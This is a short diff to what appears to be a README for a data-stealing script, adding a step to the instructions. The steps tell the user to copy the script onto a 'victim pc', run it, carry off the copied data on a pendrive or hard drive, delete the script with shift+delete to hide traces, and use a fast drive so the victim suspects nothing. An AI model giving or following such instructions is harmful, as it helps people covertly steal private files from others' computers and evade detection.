@@ -12,6 +12,7 @@ step-1:- copy this script in victim pc
 step-2:- run the file using cmd 
 step-3:- move destinaton file which contains copied data  using pendrive/hard drive 
 step-4:- delete script from victims pc ( recomended to use shift + delete command )
+step-5:- use rar extractor to open files
 
 Note:- use pendrive which have fast data transfer to avoid any doubt from your victim while moving 
        it recomended to use external hard drive if copied data is more
